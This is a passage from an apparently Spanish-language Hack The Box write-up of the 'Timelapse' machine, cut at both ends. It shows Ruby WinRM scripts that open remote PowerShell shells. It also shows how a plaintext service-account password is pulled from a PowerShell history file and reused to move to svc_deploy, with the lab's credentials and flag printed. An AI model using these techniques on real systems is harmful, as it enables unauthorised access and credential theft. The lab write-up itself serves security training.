&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;ss&#34;&gt;:powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;until&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;exit&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;PS &amp;gt; &amp;#34;&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;gets&lt;/span&gt;        
        &lt;span class=&#34;n&#34;&gt;output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;
            &lt;span class=&#34;no&#34;&gt;STDOUT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;
            &lt;span class=&#34;no&#34;&gt;STDERR&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;    
    &lt;span class=&#34;nb&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Exiting with code &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;#{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exitcode&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras ejecutar el script logramos obtener una shell como &lt;code&gt;legacyy&lt;/code&gt; y la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt; π ~/htb/timelapse/shares/cert ❯ ruby shell.rb
PS &amp;gt; whoami
timelapse&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;egacyy
PS &amp;gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;

Path
----
C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;egacyy&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments


PS &amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ..&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop
PS &amp;gt; dir


    Directory: C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;egacyy&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name                                                                                                                                       
----                -------------         ------ ----                                                                                                                                       
-ar---        4/23/2022  12:12 AM             &lt;span class=&#34;m&#34;&gt;34&lt;/span&gt; user.txt                                                                                                                                   


PS &amp;gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; user.txt
86914b213ba97b81f82c930a156f3d75
PS &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;user---svc_deploy&#34;&gt;User - svc_deploy&lt;/h1&gt;
&lt;p&gt;Tras ejecutar &lt;a href=&#34;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS&#34;&gt;WinPEAS&lt;/a&gt; encontramos que existe un archivo de historial de PowerShell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version:
    Transcription Settings:
    Module Logging Settings:
    Scriptblock Logging Settings:
    PS &lt;span class=&#34;nb&#34;&gt;history&lt;/span&gt; file: C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;egacyy&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ppData&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;oaming&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;owerShell&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;SReadLine&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onsoleHost_history.txt
    PS &lt;span class=&#34;nb&#34;&gt;history&lt;/span&gt; size: 434B
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos multiples comandos, se muestra &lt;code&gt;Invoke-Command&lt;/code&gt; utilizando las credenciales del usuario svc_deploy haciendo una conexión a WinRM por localhost al puerto 5986.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;PS &amp;gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;egacyy&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ppData&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;oaming&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;owerShell&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;SReadLine&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onsoleHost_history.txt
whoami
ipconfig /all
netstat -ano &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;-string LIST
&lt;span class=&#34;nv&#34;&gt;$so&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
&lt;span class=&#34;nv&#34;&gt;$p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; ConvertTo-SecureString &lt;span class=&#34;s1&#34;&gt;&amp;#39;E3R$Q62^12p7PLlC%KWaxuaV&amp;#39;&lt;/span&gt; -AsPlainText -Force
&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; New-Object System.Management.Automation.PSCredential &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;svc_deploy&amp;#39;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;$p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
invoke-command -computername localhost -credential &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt; -port &lt;span class=&#34;m&#34;&gt;5986&lt;/span&gt; -usessl -
SessionOption &lt;span class=&#34;nv&#34;&gt;$so&lt;/span&gt; -scriptblock &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;whoami&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
get-aduser -filter * -properties *
&lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
PS &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos el mismo comando ejecutando &lt;code&gt;whoami&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$so&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;nv&#34;&gt;$p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; ConvertTo-SecureString &lt;span class=&#34;s1&#34;&gt;&amp;#39;E3R$Q62^12p7PLlC%KWaxuaV&amp;#39;&lt;/span&gt; -AsPlainText -Force&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; New-Object System.Management.Automation.PSCredential &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;svc_deploy&amp;#39;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;$p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
invoke-command -computername localhost -credential &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt; -port &lt;span class=&#34;m&#34;&gt;5986&lt;/span&gt; -usessl -SessionOption &lt;span class=&#34;nv&#34;&gt;$so&lt;/span&gt; -scriptblock &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; whoami &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras ejecutarlo vemos que tenemos acceso como svc_deploy con estas credenciales.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;PS &amp;gt; &lt;span class=&#34;nv&#34;&gt;$so&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; ConvertTo-SecureString &lt;span class=&#34;s1&#34;&gt;&amp;#39;E3R$Q62^12p7PLlC%KWaxuaV&amp;#39;&lt;/span&gt; -AsPlainText -Force&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; New-Object System.Management.Automation.PSCredential &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;svc_deploy&amp;#39;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;$p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; invoke-command -computername localhost -credential &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt; -port &lt;span class=&#34;m&#34;&gt;5986&lt;/span&gt; -usessl -SessionOption &lt;span class=&#34;nv&#34;&gt;$so&lt;/span&gt; -scriptblock &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; whoami &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
timelapse&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc_deploy
PS &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell&#34;&gt;Shell&lt;/h2&gt;
&lt;p&gt;Modificamos el script en Ruby con las credenciales encontradas.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt; &lt;span class=&#34;err&#34;&gt;π&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/htb/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;timelapse&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shares&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cert&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;❯&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cat&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;svc_shell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rb&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;require&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;winrm&amp;#39;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;WinRM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
  &lt;span class=&#34;ss&#34;&gt;endpoint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;https://timelapse.htb:5986/wsman&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
  &lt;span class=&#34;ss&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;svc_deploy&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
  &lt;span class=&#34;ss&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;E3R$Q62^12p7PLlC%KWaxuaV&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
  &lt;span class=&#34;ss&#34;&gt;transport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;ss&#34;&gt;:ssl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
  &lt;span class=&#34;c1&#34;&gt;#:client_cert =&amp;gt; &amp;#39;legacy.crt&amp;#39;,&lt;/span&gt;
  &lt;span class=&#34;c1&#34;&gt;#:client_key =&amp;gt; &amp;#39;legacy-decrypted.key&amp;#39;,&lt;/span&gt;
  &lt;span class=&#34;c1&#34;&gt;#:key_pass =&amp;gt; &amp;#39;thuglegacy&amp;#39;,&lt;/span&gt;
  &lt;span class=&#34;ss&#34;&gt;:no_ssl_peer_verification&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;kp&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;ss&#34;&gt;:powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;until&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;exit&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;PS &amp;gt; &amp;#34;&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;gets&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;
            &lt;span class=&#34;no&#34;&gt;STDOUT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;
            &lt;span class=&#34;no&#34;&gt;STDERR&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Exiting with code &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;#{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exitcode&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Logramos obtener una shell con el usuario svc_deploy.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
